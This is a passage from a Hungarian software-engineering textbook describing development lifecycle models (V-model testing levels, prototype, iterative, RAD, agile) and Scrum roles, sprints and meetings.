mert a folyamatban visszafelé haladni nem lehet, és ha rossz a követelmény specifikáció,
akkor nem az igényeknek megfelelõ szoftver fog elkészülni. Ezzel szemben például a
prototípus modellben lehet pongyola az igényfelmérés, mert az a prototípusok során úgyis
pontosításra kerül.
Ezután következik a funkcionális specifikáció elkészítése, amely leírja, hogyan kell majd
mûködnie a szoftvernek. Ez lesz a rendszerteszt alapja. Ha a funkcionális specifikáció azt írja, 
2-5
hogy a „Vásárol gomb megnyomására ki kell írni a kosárban lévõ áruk értékét”, akkor a
rendszertesztben lesz egy vagy több teszteset, amely ezt teszteli. Például, ha üres a kosár,
akkor az árnak nullának kell lennie.
Ezután következik a rendszerterv, amely leírja, hogy az egyes funkciókat hogyan, milyen
komponensekkel, osztályokkal, metódusokkal, adatbázissal fogjuk megvalósítani. Ez lesz a
komponens teszt egyik alapja. A rendszerterv leírja tovább, hogy a komponensek hogyan
mûködnek együtt. Ez lesz az integrációs teszt alapja.
Ezután a rendszertervnek megfelelõen következik az implementáció. Minden metódushoz
egy vagy több unit-tesztet kell készíteni. Ezek alapja nem csak az implementáció, hanem a
rendszerterv is. A nagyobb egységeket, osztályokat, al- és fõfunkciókat is komponens teszt
alá kell vetni az implementáció és a rendszerterv alapján.
Ha ezen sikeresen túl vagyunk, akkor az integrációs teszt következik a rendszerterv alapján.
Ha itt problémák merülnek fel, akkor visszamegyünk a V betû másik szárára a
rendszertervhez. Megnézzük, hogy a hiba a rendszertervben vagy az implementációban vane. Ha kell, megváltoztatjuk a rendszertervet, majd az implementációt is.
Az integrációs teszt után jön a rendszerteszt a funkcionális specifikáció alapján. Hasonlóan,
hiba esetén a V betû másik szárára megyünk, azaz visszalépünk a funkcionális specifikáció
elkészítésére. Majd jön az átvételi teszt a követelmény specifikáció alapján. Remélhetõleg itt
már nem lesz hiba, mert kezdhetnénk az egészet elölrõl, ami egyenlõ a sikertelen projekttel.
Ha a fejlesztés és tesztelés alatt nem változnak a követelmények, akkor ez egy nagyon jó,
kiforrott, támogatott módszertan. Ha valószínû a követelmények változása, akkor inkább
iteratív, vagy még inkább agilis módszert válasszunk.
2.4.1 Prototípus modell
A prototípus modell válasz a vízesés modell sikertelenségére. A fejlesztõ cégek rájöttek, hogy
tarthatatlan a vízesés modell megközelítése, hogy a rendszerrel a felhasználó csak a projekt
végén találkozik. Gyakran csak ekkor derült ki, hogy az életciklus elején félreértették egymást
a felek és nem a valós követelményeknek megfelelõ rendszer született. Ezt elkerülendõ a
prototípus modell azt mondja, hogy a végsõ átadás elõtt több prototípust is szállítsunk le,
hogy mihamarabb kiderüljenek a félreértések, illetve a megrendelõ lássa, mit várhat a
rendszertõl.
A prototípus alapú megközelítése a fejlesztésnek azon alapszik, hogy a megrendelõ üzleti
folyamatai, követelményei nem ismerhetõk meg teljesen. Már csak azért sem, mert ezek az
idõvel változnak (lásd az agilis módszertanokat). A követelményeket érdemes finomítani
prototípusok segítségével. Ha a felhasználó használatba vesz egy prototípust, akkor képes
megfogalmazni, hogy az miért nem felel meg az elvárásainak és hogyan kellene
megváltoztatni. Ebben a megközelítésben a leszállított rendszer is egy prototípus. 
2-6
Ez a megközelítés annyira sikeres volt, hogy a modern módszertanok majd mindegyike
prototípus alapú. Az iteratív módszerek általában minden mérföldkõhöz kötnek egy
prototípust. Az agilis módszertanok akár minden nap új (lásd napi fordítás) prototípust
állítanak elõ.
A kezdeti prototípus fejlesztése általában a következõ lépésekbõl áll:
• 1. lépés: Az alap követelmények meghatározása: Olyan alap követelmények
meghatározása, mint a bemeneti és kimeneti adatok. Általában a teljesítményre vagy
a biztonságra vonatkozó követelményekkel nem foglalkozunk.
• 2. lépés: Kezdeti prototípus kifejlesztése: Csak a felhasználói felületeket fejlesztjük le
egy erre alkalmas CASE eszközzel. A mögötte lévõ funkciókat nem, kivéve az új
ablakok nyitását.
• 3. lépés: Bemutatás: Ez egyfajta felhasználói átvételi teszt. A végfelhasználók
megvizsgálják a prototípust, és jelzik, hogy mit gondolnak másként, illetve mit
tennének még hozzá.
• 4. lépés. A követelmények pontosítása: A visszajelzéseket felhasználva pontosítjuk a
követelmény specifikációt. Ha még mindig nem elég pontos a specifikáció, akkor a
prototípust továbbfejlesztjük és ugrunk a 3. lépésre. Ha elég pontos képet kaptunk
arról, hogy mit is akar a megrendelõ, akkor az egyes módszertanok mást és mást
írnak elõ. 
2-7
A prototípus készítést akkor a legcélszerûbb használni, ha a rendszer és a felhasználó között
sok lesz a párbeszéd. A modell on-line rendszerek elemzésében és tervezésében nagyon
hatékony, különösen a tranzakció feldolgozásnál. Olyan rendszereknél, ahol kevés interakció
zajlik a rendszer és a felhasználó között, ott kevésbé éri meg a prototípus modell használata,
ilyenek például a számítás igényes feladatok. Különösen jól használható a felhasználói felület
kialakításánál.
A prototípus modell nagyban épít a tesztelésre. Minden prototípust felhasználói átvételi
tesztnek vetnek alá, ami során könnyen kiderül, hogy milyen funkcionális és nemfunkcionális
követelményt nem tart be a prototípus. A korai szakaszban sok unit-tesztet alkalmazunk.
Amikor befejezünk egy újabb prototípust, akkor regressziós teszttel vizsgáljuk meg, hogy ami
az elõzõ prototípusban mûködött, az továbbiakban is mûködik-e. Ha az új prototípusban van
új komponens is, akkor a régi és az új komponensek között, illetve az új – új komponensek
között integrációs tesztet kell végrehajtani. A modell késõbbi szakaszában, miután már a
követelmény és a funkcionális specifikáció letisztult, egy vízesés modellre hasonlít. Azaz az
implementáció után jön a tesztelés. Ekkor elvégezzük újból komponens és integrációs
teszteket is. Rendszertesztet általában csak a végsõ prototípus átadás elõtt végzünk.
2.4.2 Iteratív és inkrementális módszertanok
Az iteratív módszertan elõírja, hogy a fejlesztést, kezdve az igényfelméréstõl az
üzemeltetésig, kisebb iterációk sorozatára bontsuk. Eltérõen a vízesés modelltõl, amelyben
például a tervezés teljesen megelõzni az implementációt, itt minden iterációban van
tervezés és implementációi is. Lehet, hogy valamelyik iterációban az egyik sokkal
hangsúlyosabb, mint a másik, de ez természetes.
A folyamatos finomítás lehetõvé teszi, hogy mélyen megértsük a feladatot és felderítsük az
ellentmondásokat. Minden iteráció kiegészíti a már kifejlesztett prototípust. A kiegészítést
inkrementumnak is nevezzük. Azok a módszertanok, amik a folyamatra teszik a hangsúlyt,
azaz az iterációra, azokat iteratív módszertanoknak nevezzük. Azokat, amelyek az iteráció
termékére, az inkrementumra teszik a hangsúlyt, azokat inkrementális módszertanoknak
hívjuk. A mai módszertanok nagy része, kezdve a prototípus modelltõl egészen az agilis
modellekig, ebbe a családba tartoznak.
A kiegészítés hozzáadásával növekvõ részrendszer jön létre, amelyet tesztelni kell. Az új
kódot unit-teszttel teszteljük. Regressziós teszttel kell ellenõrizni, hogy a régi kód továbbra is
mûködik-e az új kód hozzáadása és a változások után. Az új és a régi kód együttmûködését
integrációs teszttel teszteljük. Ha egy mérföldkõhöz vagy prototípus bemutatáshoz érkezünk,
akkor van felhasználói átvételi teszt is. Egyébként csak egy belsõ átvételi teszt van az iteráció
végén. 
2-8
Ezt a megközelítést több módszertan is alkalmazza, például a prototípus modell, a gyors
alkalmazásfejlesztés (RAD), a Rational Unified Process (RUP) és az agilis fejlesztési modellek.
Itt ezeknek a módszertanoknak a közös részét, az iterációt ismertetjük. Egy iteráció a
következõ feladatokból áll:
• Üzleti folyamatok elemzése
• Követelményelemzés
• Elemzés és tervezés
• Implementáció
• Tesztelés
• Értékelés 
2-9
Az iteratív modell fõ ereje abban rejlik, hogy az életciklus lépései nem egymás után jönnek,
mint a strukturált módszertanok esetén, hanem idõben átfedik egymást. Minden iterációban
van elemzés, tervezés, implementáció és tesztelés. Ezért, ha találunk egy félreértést, akkor
nem kell visszalépni, hanem néhány iteráció segítségével oldjuk fel a félreértést. Ez az jelenti,
hogy kevésbé tervezhetõ a fejlesztés ideje, de jól alkalmazkodik az igények változásához.
Mivel a fejlesztés lépéseit mindig ismételgetjük, ezért azt mondjuk, hogy ezek idõben átfedik
egymást, hiszen minden szakaszban minden lépést végre kell hajtani. A kezdeti iterációkban
több az elemzés, a végéhez közeledve egyre több a tesztelés. Már a legelsõ szakaszban is van
tesztelés, de ekkor még csak a teszttervet készítjük. Már a legelsõ szakaszban is van
implementáció, de ekkor még csak az architektúra osztályait hozzuk létre. És így tovább.
A feladatot több iterációra bontjuk. Ezeket általában több kisebb csapat implementálja
egymással versengve. Aki gyorsabb, az választhat iterációt a meglévõk közül. A választás nem
teljesen szabad, a legnagyobb prioritású feladatok közül kell választani. A prioritás
meghatározása különbözõ lehet, általában a leggyorsabban megvalósítható és legnagyobb
üzleti értékû, azaz a legnagyobb üzleti megtérüléssel (angolul: return of investment) bíró
feladat a legnagyobb prioritású.
Üzleti folyamatok elemzése: Elsõ lépésben meg kell ismerni a megrendelõ üzleti folyamatait.
Az üzleti folyamatok modellezése során fel kell állítani egy projekt fogalomtárat. A
lemodellezett üzleti folyamatokat egyeztetni kell a megrendelõvel, hogy ellenõrizzük jól
értjük-e az üzleti logikát. Ezt üzleti elemzõk végzik, akik a megrendelõk és a fejlesztõk fejével
is képesek gondolkozni.
Követelményelemzés: A követelmény elemzés során meghatározzuk a rendszer funkcionális
és nemfunkcionális követelményeit, majd ezekbõl funkciókat, képernyõterveket készítünk.
Ez a lépés az egész fejlesztés elején nagyon hangsúlyos, hiszen a kezdeti iterációk célja a
követelmények felállítása. Késõbbiekben csak a funkcionális terv finomítása a feladata.
Fontos, hogy a követelményeket egyeztessük a megrendelõkkel. Ha a finomítás során
ellentmondást fedezünk fel, akkor érdemes tisztázni a kérdést a megrendelõvel.
Elemzés és tervezés: Az elemzés és tervezés során a követelmény elemzés termékeibõl
megpróbáljuk elemezni a rendszert és megtervezni azt. A nemfunkcionális
követelményekbõl lesz az architekturális terv. Az architekturális terv alapján tervezzük az
alrendszereket és a köztük levõ kapcsolatokat. Ez a kezdeti iterációk feladata. A funkcionális
követelmények alapján tervezzük meg az osztályokat, metódusokat és az adattáblákat. Ezek
a késõbbi iterációk feladatai.
Implementáció: Az implementációs szakaszra ritkán adnak megszorítást az iteratív
módszertanok. Általában a bevett technikák alkalmazását ajánlják, illetve szerepköröket
írnak elõ. Pl.: a fejlesztõk fejlesztik a rendszert, a fejlesztõk szoros kapcsolatban vannak a
tervezõkkel, továbbá van egy kód ellenõr, aki ellenõrzi, hogy a fejlesztõk által írt programok 
2-10
megfelelnek-e a tervezõk által kitalált tervezési és programozási irányelveknek. Ebben a
szakaszban a programozók unit-teszttel biztosítják a kód minõségét.
Tesztelés: A tesztelési szakaszban különbözõ tesztelési eseteket találunk ki, ezeket unittesztként valósítjuk meg. Itt vizsgáljuk meg, hogy az elkészült kód képes-e együttmûködni a
program többi részével, azaz integrációs tesztet hajtunk végre. Regressziós tesztek
segítségével ellenõrizzük, hogy ami eddig kész volt, az nem romlott el. Ehhez lefuttatjuk az
összes unit-tesztet. Rendszerteszt csak a késõi tesztelési fázisokban van.
Értékelés: A fejlesztés minden ciklusában el kell dönteni, hogy az elkészült verziót elfogadjuke, vagy sem. Ha nem, akkor újra indul ez az iteráció. Ha igen, vége ennek az iterációnak. Az
így elkészült kódot feltöltjük a verziókövetõ rendszerbe, hogy a többi csapat is hozzáférjen.
Az értékelés magában foglal egy átvételi tesztet is. Ha a megrendelõ nem áll rendelkezésre,
akkor általában a csoportok munkáját összefogó vezetõ programozó / tervezõ helyettesíti.
Amennyiben a folyamat során elértünk egy mérföldkõhöz, akkor általában át kell adnunk egy
köztes prototípust is. Ekkor mindig rendelkezésre áll a megrendelõ, hogy elvégezzük a
felhasználói átvételi tesztet.
Támogató tevékenységek, napi fordítás: Az iterációktól függetlenül úgynevezett támogató
folyamatok is zajlanak a szoftver cégen belül. Ilyen például a rendszergazdák vagy a
menedzsment tevékenysége. Az iterációk szemszögébõl a legfontosabb az úgynevezett a
napi fordítás (daily build). Ez azt jelenti, hogy minden nap végén a verziókövetõ rendszerben
lévõ forráskódot lefordítjuk. Minden csapat igyekszik a meglévõ kódhoz igazítani a sajátját,
hogy lehetséges legyen a fordítás. Aki elrontja a napi fordítást, és ezzel nehezíti az összes
csapat következõ napi munkáját, az büntetésre számíthat. Ez a cég hagyományaitól függ,
általában egy hétig õ csinálja a napi fordítás és emiatt sokszor sokáig bent kell maradnia.
Végül vagy elérjük azt a pontot, ahol azt mondjuk, hogy ez így nem elkészíthetõ, vagy azt
mondjuk, hogy minden felmerült igényt kielégít a szoftverünk és szállíthatjuk a
megrendelõnek.
2.4.3 Gyors alkalmazásfejlesztés – RAD
A gyors alkalmazásfejlesztés vagy ismertebb nevén RAD (Rapid Application Development)
egy olyan elgondolás, amelynek lényege a szoftver gyorsabb és jobb minõségû elkészítése.
Ezt a következõk által érhetjük el:
• Korai prototípus készítés és ismétlõdõ felhasználói átvételi tesztek.
• A csapat - megrendelõ és a csapaton belüli kommunikációban kevésbé formális.
• Szigorú ütemterv, így az újítások mindig csak a termék következõ verziójában
jelennek meg.
• Követelmények összegyûjtése fókusz csoportok és munkaértekezletek használatával. 
2-11
• Komponensek újrahasznosítása.
Ezekhez a folyamatokhoz több szoftvergyártó is készített segédeszközöket, melyek részben
vagy egészben lefedik a fejlesztés fázisait, mint például:
• követelmény összegyûjtõ eszközök,
• tervezést segítõ eszközök,
• prototípus készítõ eszközök,
csapatok kommunikációját segítõ eszközök.
A RAD elsõsorban az objektumorientált programozással kacsolódik össze, már csak a
komponensek újrahasznosítása okán is. Összehasonlítva a hagyományos fejlesztési
metódusokkal (pl.: vízesés modell), ahol az egyes fejlesztési fázisok jól elkülönülnek
egymástól, a RAD sokkal rugalmasabban. Gyakori probléma, hogy a tervezésbe hiba csúszik,
és az csak a megvalósítási vagy a tesztelési fázisban jön elõ, ráadásul az elemzés és a
tesztelési fázis között hat-hét hónap is eltelhet. Vagy ha menetközbe megváltoznak az üzleti
körülmények, és már a megvalósítási fázisban járunk, vagy csak rájöttek a megrendelõk,
hogy valamit mégis másképpen szeretnének, akkor szintén gondban vagyunk. A RAD válasza
ezekre a problémákra a gyorsaság. Ha gyorsan hozzuk létre a rendszert, akkor ezen rövid idõ
alatt nem változnak a követelmények, az elemzés és tesztelés között nem hat-hét hónap,
hanem csak hat-hét hét telik el.
A gyorsaság eléréséhez sok meglévõ komponenst kell felhasználni, amit a csapatnak jól kell
ismernie. A komponensek lehetnek saját fejlesztésûek vagy megvásároltak. Komponenst
vásárolni nagy kockázat, mert ha hiba van benne, azt nem tudjuk javítani, ha nem kapjuk
meg a forrást, de még úgy is nagyon nehéz. Ezért a komponens gyártók nagyon alaposan
tesztelik terméküket.
A RAD az elemzést, a tervezést, a megvalósítást, és a tesztelést rövid, ismétlõdõ ciklusok
sorozatába tömöríti, és ennek sok elõnye van a hagyományos modellekkel szemben. A
fejlesztés során általában kis csoportokat hoznak létre fejlesztõkbõl, végfelhasználókból, ez
az úgynevezett fókusz csoport. Ezek a csapatok az ismétlõdõ, rövid ciklusokkal vegyítve
hatékonyabbá teszik a kommunikációt, optimalizálják a fejlesztési sebességet, egységesítik
az elképzeléseket és célokat, valamint leegyszerûsítik a folyamat felügyeletét.
Öt fejlesztési lépés a RAD-ban:
• Üzleti modellezés: Az üzleti funkciók közötti információ áramlást olyan kérdések
feltevésével tudjuk felderíteni, mint hogy milyen információk keletkeznek, ezeket ki
állítja elõ, az üzleti folyamatot milyen információk irányítják, vagy hogy ki irányítja.
• Adat modellezés: Az üzleti modellezéssel összegyûjtöttük a szükséges adatokat, 
2-12
melyekbõl adat objektumokat hozunk létre. Beazonosítjuk az attribútumokat és a
kapcsolatokat az adatok között.
• Folyamat modellezés: Az elõzõleg létrehozott adatmodellhez szükséges mûveletek
(bõvítés, törlés, módosítás) meghatározása, úgy hogy létrehozzuk a kellõ
információáramlást az üzleti funkciók számára.
• Alkalmazás elõállítása: A szoftver elõállításának megkönnyítése automatikus
eszközökkel.
• Tesztelés: Az új programkomponensek tesztelése, a már korábban tesztelt
komponenseket már nem szükséges újra vizsgálni. Ez gyorsítja a folyamatot.
Hátránya, hogy magasan képzett fejlesztõkre van szükség, emellett fontos a fejlesztõk és a
végfelhasználók elkötelezettsége a sikeres szoftver iránt. Ha a projekt nehezen bontható fel
modulokra, akkor nem a legjobb választás a RAD. Nagyobb rendszerek fejlesztése ezzel a
módszertannal kockázatos.
2.4.4 Agilis szoftverfejlesztés
Az agilis szoftverfejlesztés valójában iteratív szoftverfejlesztési módszerek egy csoportjára
utal, amelyet 2001-ben az Agile Manifesto nevû kiadványban öntöttek formába. Az agilis
fejlesztési módszerek (nevezik adaptívnak is) egyik fontos jellemzõje, hogy a résztvevõk,
amennyire lehetséges megpróbálnak alkalmazkodni a projekthez. Ezért fontos például, hogy
a fejlesztõk folyamatosan tanuljanak.
Az agilis szoftverfejlesztés szerint értékesebbek:
• az egyének és interaktivitás szemben a folyamatokkal és az eszközökkel,
• a mûködõ szoftver szemben a terjedelmes dokumentációval,
• az együttmûködés a megrendelõvel szemben a szerzõdéses tárgyalásokkal,
• az alkalmazkodás a változásokhoz szemben a terv követésével. 
2-13
Az agilis szoftverfejlesztés alapelvei:
• A legfontosabb a megrendelõ kielégítése használható szoftver gyors és folyamatos
átadásával.
• Még a követelmények kései változtatása sem okoz problémát.
• A mûködõ szoftver / prototípus átadása rendszeresen, a lehetõ legrövidebb idõn
belül.
• Napi együttmûködés a megrendelõ és a fejlesztõk között.
• A projektek motivált egyének köré épülnek, akik megkapják a szükséges eszközöket
és támogatást a legjobb munkavégzéshez.
• A leghatékonyabb kommunikáció a szemtõl-szembeni megbeszélés.
• Az elõrehaladás alapja a mûködõ szoftver.
• Az agilis folyamatok általi fenntartható fejlesztés állandó ütemben.
• Folyamatos figyelem a technikai kitûnõségnek.
• Egyszerûség, a minél nagyobb hatékonyságért.
• Önszervezõ csapatok készítik a legjobb terveket.
• Rendszeres idõközönként a csapatok reagálnak a változásokra, hogy még
hatékonyabbak legyenek.
Az agilis szoftverfejlesztésnek nagyon sok fajtája van. Ebben a jegyzetben csak ezt a kettõt
tárgyaljuk:
• Scrum
• Extrém Programozás (XP)
Ezek a következõ közös jellemzõkkel bírnak:
• Kevesebb dokumentáció.
• Növekvõ rugalmasság, csökkenõ kockázat.
• Könnyebb kommunikáció, javuló együttmûködés.
• A megrendelõ bevonása a fejlesztésbe.
Kevesebb dokumentáció: Az agilis metódusok alapvetõ különbsége a hagyományosakhoz
képest, hogy a projektet apró részekre bontják, és mindig egy kisebb darabot tesznek hozzá 
2-14
a termékhez, ezeket egytõl négy hétig terjedõ ciklusokban (más néven keretekben vagy
idõdobozokban) készítik el, és ezek a ciklusok ismétlõdnek. Ezáltal nincs olyan jellegû
részletes hosszú távú tervezés, mint például a vízeséses modellnél, csak az a minimális, amire
az adott ciklusban szükség van. Ez abból az elvbõl indul ki, hogy nem lehet elõre tökéletesen,
minden részletre kiterjedõen megtervezni egy szoftvert, mert vagy a tervben lesz hiba, vagy
a megrendelõ változtat valamit.
Növekvõ rugalmasság, csökkenõ kockázat: Az agilis módszerek a változásokhoz adaptálható
technikákat helyezik elõnybe a jól tervezhetõ technikákkal szemben. Ennek megfelelõen
iterációkat használnak. Egy iteráció olyan, mint egy hagyományos életciklus: tartalmazza a
tervezést, a követelmények elemzését, a kódolást, és a tesztelést. Egy iteráció maximum egy
hónap terjedelmû, így nõ a rugalmasság, valamint csökken a kockázat, hiszen az iteráció
végén átvételi teszt van, ami után megrendelõ megváltoztathatja eddigi követelményeit.
Minden iteráció végén futóképes változatot kell kiadniuk a csapatoknak a kezükbõl.
Könnyebb kommunikáció, javuló együttmûködés: Jellemzõ, hogy a fejlesztõ csoportok
önszervezõek, és általában nem egy feladatra specializálódottak a tagok, hanem többféle
szakterületrõl kerülnek egy csapatba, így például programozok és tesztelõk. Ezek a csapatok
ideális esetben egy helyen, egy irodában dolgoznak, a csapatok mérete ideális esetben 5-9
fõ. Mindez leegyszerûsíti a tagok közötti kommunikációt és segíti a csapaton belüli
együttmûködést. Az agilis módszerek elõnyben részesítik a szemtõl szembe folytatott
kommunikációt az írásban folytatott eszmecserével szemben.
A megrendelõ bevonása a fejlesztésbe: Vagy személyesen a megrendelõ vagy egy kijelölt
személy, aki elkötelezi magát a termék elkészítése mellett, folyamatosan a fejlesztõk
rendelkezésére áll, hogy a menet közben felmerülõ kérdéseket minél hamarabb meg tudja
válaszolni. Ez a személy a ciklus végén is részt vesz az elkészült prototípus kiértékelésében.
Fontos feladata az elkészítendõ funkciók fontossági sorrendjének felállítása azok üzleti
értéke alapján. Az üzleti értékbõl és a fejlesztõ csapat által becsült fejlesztési idõbõl
számolható a befektetés megtérülése (Return of Investment, ROI). A befektetés megtérülése
az üzleti érték és a fejlesztési idõ hányadosa.
Az agilis módszertanok nagyon jól mûködnek, amíg a feladatot egy közepes méretû (5-9 fõs)
csapat képes megoldani. Nagyobb csoportok esetén nehéz a csapat szellem kialakítása. Ha
több csoport dolgozik ugyanazon a célon, akkor köztük a kommunikáció nehézkes. Ha
megrendelõ nem hajlandó egy elkötelezett munkatársát a fejlesztõ csapat rendelkezésére
bocsátani, akkor az kiváltható egy üzleti elemzõvel, aki átlátja a megrendelõ üzleti
folyamatait, de ez kockázatos.
2.4.5 Scrum
A Scrum egy agilis szoftverfejlesztési metódus. Jellegzetessége, hogy fogalmait az amerikai
futballból, más néven rugby, meríti. Ilyen fogalom, maga a Scrum is, amely dulakodást jelent.
A módszertan jelentõs szerepet tulajdonít a csoporton belüli összetartásnak. A csoporton 
2-15
belül sok a találkozó, a kommunikáció, lehetõség van a gondok megbeszélésre is. Az ajánlás
szerint jó, ha a csapat egy helyen dolgozik és szóban kommunikál.
A Scrum által elõírt fejlesztési folyamat röviden így foglalható össze: A Product Owner
létrehoz egy Product Backlog-ot, amelyre a teendõket felhasználói sztoriként veszi fel. A
sztorikat prioritással kell ellátni és megmondani, mi az üzleti értékük. Ez a Product Owner
feladata. A Sprint Planning Meetingen a csapat tagjai megbeszélik, hogy mely sztorik
megvalósítását vállalják el, lehetõleg a legnagyobb prioritásúakat. Ehhez a sztorikat kisebb
feladatokra bontják, hogy megbecsülhessék mennyi ideig tart megvalósítani azokat. Ezután
jön a sprint, ami 2-4 hétig tart. A sprint idõtartamát az elején fixálja a csapat, ettõl eltérni
nem lehet. Ha nem sikerül befejezni az adott idõtartam alatt, akkor sikertelen a sprint, ami
büntetést, általában prémium megvonást, von maga után. A sprinten belül a csapat és a
Scrum Master naponta megbeszélik a történteket a Daily Meetingen. Itt mindenki elmondja,
hogy mit csinált, mi lesz a következõ feladata, és milyen akadályokba (impediment) ütközött.
A sprint végén következik a Sprint Review, ahol a csapat bemutatja a sprint alatt elkészült
sztorikat. Ezeket vagy elfogadják, vagy nem. Majd a Sprint Retrospective találkozó
következik, ahol a Sprint során felmerült problémákat tárgyalja át a csapat. A megoldásra
konkrét javaslatokat kell tenni. Ezek után újra a Sprint Planning Meeting következik. A
fejlesztett termék az elõtt piacra kerülhet, hogy minden sztorit megvalósítottak volna.
A csapatban minden szerepkör képviselõje megtalálható, így van benne fejlesztõ és tesztelõ
is. Téves azt gondolni, hogy a sprint elején a tesztelõ is programot ír, hiszen, amíg nincs
program, nincs mit tesztelni. Ezzel szemben a tesztelõ a sprint elején a tesztelõ a teszttervet
készít, majd kidolgozza a teszteseteket, végül, amikor már vannak kész osztályok, unitteszteket ír, a változásokat regressziós teszttel ellenõrzi.
A Scrum, mint minden agilis módszertan, arra épít, hogy a fejlesztés közben a megrendelõ
igényei változhatnak. A változásokhoz úgy alkalmazkodik, a Product Backlog folyamatosan
változhat. Az erre épülõ dokumentumok folyamatosan finomodnak, tehát könnyen
változtathatók. A csapatok gyorsan megvalósítják a szükséges változásokat.
A Scrum tökélyre viszi az egy csapaton belüli hatékonyságot. Ha több csapat is dolgozik egy
fejlesztésen, akkor köztük lehetnek kommunikációs zavarok, ami a módszertan egyik
hátránya. 
2-16
A Scrum két nagyon fontos fogalma a sprint és az akadály.
Sprint (vagy futam): Egy elõre megbeszélt hosszúságú fejlesztési idõszak, általában 2-4 hétig
tart, kezdõdik a Sprint Planning-gel, majd a Retrospective-vel zárul. Ez a Scrum úgynevezett
iterációs ciklusa, addig kell ismételni, amíg a Product Backlog-ról el nem tûnnek a
megoldásra váró felhasználói sztorik. Alapelv, hogy minden sprint végére egy potenciálisan
leszállítható szoftvert kell elõállítani a csapatnak, azaz egy prototípust. A sprint tekinthetõ
két mérföldkõ közti munkának.
Akadály (Impediment): Olyan gátló tényezõ, amely a munkát hátráltatja. Csak és kizárólag
munkahelyi probléma tekinthetõ akadálynak. A csapattagok magánéleti problémái nem
azok. Akadály például, hogy lejárt az egyik szoftver licence, vagy szükség lenne egy plusz
gépre a gyorsabb haladáshoz, vagy több memóriára az egyik gépbe, vagy akár az is lehet,
hogy 2 tag megsértõdött egymásra. Ilyenkor kell a Scrum Masternek elhárítani az
akadályokat, hogy a munka minél gördülékenyebb legyen.
A módszertan szerepköröket, megbeszéléseket és elkészítendõ termékeket ír elõ.
Szerepkörök
A módszertan kétféle szerepkört különböztet meg, ezek a disznók és a csirkék. A
megkülönböztetés alapja egy vicc:
A disznó és a csirke mennek az utcán. Egyszer csak a csirke megszólal: „Te, nyissunk egy
éttermet!” Mire a disznó: „Jó ötlet, mi legyen a neve?” A csirke gondolkozik, majd rávágja:
„Nevezzük Sonkástojásnak!” A disznó erre: „Nem tetszik valahogy, mert én biztosan mindent
beleadnék, te meg éppen csak hogy részt vennél benne.”
A disznók azok, akik elkötelezettek a szoftver projekt sikerében. Õk azok, akik a „vérüket”
adják a projekt sikeréért, azaz felelõsséget vállalnak érte. A csirkék is érdekeltek a projekt
sikerében, õk a haszonélvezõi a sikernek, de ha esetleg mégse sikeres a projekt, akkor az
nem az õ felelõsségük. 
2-17
Disznók:
• Scrum mester (Scrum Master)
• Terméktulajdonos (Product Owner)
• Csapat (Team)
Csirkék:
• Üzleti szereplõk (Stakeholders)
• Menedzsment (Managers)
Scrum mester (Scrum Master): A Scrum mester felügyeli és megkönnyíti a folyamat
fenntartását, segíti a csapatot, ha problémába ütközik, illetve felügyeli, hogy mindenki
betartja-e a Scrum alapvetõ szabályait. Ilyen például, hogy a Sprint idõtartama nem térhet el
az elõre megbeszélttõl, még akkor sem, ha az elvállalt munka nem lesz kész. Akkor is nemet
kell mondania, ha a Product Owner a sprint közben azt találja ki, hogy az egyik sztorit, amit
nem vállaltak be az adott idõszakra, el kellene készíteni, mert mondjuk megváltoztak az
üzleti körülmények. Lényegében õ a projekt menedzser.
Termék tulajdonos (Product Owner): A megrendelõ szerepét tölti be, õ a felelõs azért, hogy a
csapat mindig azt a részét fejlessze a terméknek, amely éppen a legfontosabb, vagyis a
felhasználói sztorik fontossági sorrendbe állítása a feladata a Product Backlog-ban. A Product
Owner és a Scrum Master nem lehet ugyanaz a személy.
Csapat (Team): Õk a felelõsek azért, hogy az aktuális sprintre bevállalt feladatokat
elvégezzék, ideális esetben 5-9 fõ alkot egy csapatot. A csapatban helyet kapnak a fejlesztõk,
tesztelõk, elemzõk. Így nem a váltófutásra jellemzõ stafétaváltás (mint a vízesés modellnél),
hanem a futballra emlékeztetõ passzolgatás, azaz igazi csapatjáték jellemzi a csapatot.
Üzleti szereplõk, pl.: megrendelõk, forgalmazók (Stakeholders, i.e., customers, vendors): A
megrendelõ által jön létre a projekt, õ az, aki majd a hasznát látja a termék elkészítésének, a
Sprint Review során kap szerepet a folyamatban.
Menedzsment (Managers): A menedzsment feladata a megfelelõ környezet felállítása a
csapatok számára. Általában a megfelelõ környezeten túl a lehetõ legjobb környezet
felállítására törekszenek.
Megbeszélések
Sprint Planning Meeting (futamtervezõ megbeszélés): Ezen a találkozón kell megbeszélni,
hogy ki mennyi munkát tud elvállalni, majd ennek tudatában dönti el a csapat, hogy mely
sztorikat vállalja be a következõ sprintre. Emellett a másik lényeges dolog, hogy a csapat a
Product Owner-rel megbeszéli, majd teljes mértékben megérti, hogy a vevõ mit szeretne az
adott sztoritól, így elkerülhetõek az esetleges félreértésekbõl adódó problémák. Ha volt 
2-18
Backlog Grooming, akkor nem tart olyan sokáig a Planning, ugyanis a csapat ismeri a Backlogot, azon nem szükséges finomítani, hacsak a megrendelõtõl nem érkezik ilyen igény. A
harmadik dolog, amit meg kell vizsgálni, hogy a csapat hogyan teljesített az elõzõ sprintben,
vagyis túlvállalta-e magát vagy sem. Ha túl sok sztorit vállaltak el, akkor le kell vonni a
következtetést, és a következõ sprintre kevesebbet vállalni. Ez a probléma leginkább az új,
kevéssé összeszokott csapatokra jellemzõ, ahol még nem tudni, hogy mennyi munkát bír
elvégezni a csapat. Ellenkezõ esetben, ha alulvállalta magát egy csapat, akkor
értelemszerûen többet vállaljon, illetve, ha ideális volt az elõzõ sprint, akkor hasonló
mennyiség a javasolt.
Backlog Grooming/Backlog Refinement: A Product Backlog finomítása a Teammel együtt,
elõfordulhat például, hogy egy taszk túl nagy, így story lesz belõle, és utána taszkokra bontva
lesz feldolgozva. Ha elmarad, akkor a Sprint Planning hosszúra nyúlhat, valamint abban is
nagy segítség, hogy a csapat tökéletesen megértse, hogy mit szeretne a megrendelõ.
Daily Meeting/Daily Scrum: A sprint ideje alatt minden nap kell tartani egy rövid
megbeszélést, ami maximum 15 perc, és egy elõre megbeszélt idõpontban, a csapattagok és
a Scrum Master jelenlétében történik (mások is ott lehetnek, de nem szólhatnak bele).
Érdekesség, hogy nem szabad leülni, mindenki áll, ezzel is jelezve, hogy ez egy rövid
találkozó. Három kérdésre kell válaszolnia a csapat tagjainak, ezek a következõek:
• Mit csináltál a tegnapi megbeszélés óta?
• Mit fogsz csinálni a következõ megbeszélésig?
• Milyen akadályokba ütköztél az adott feladat megoldása során?
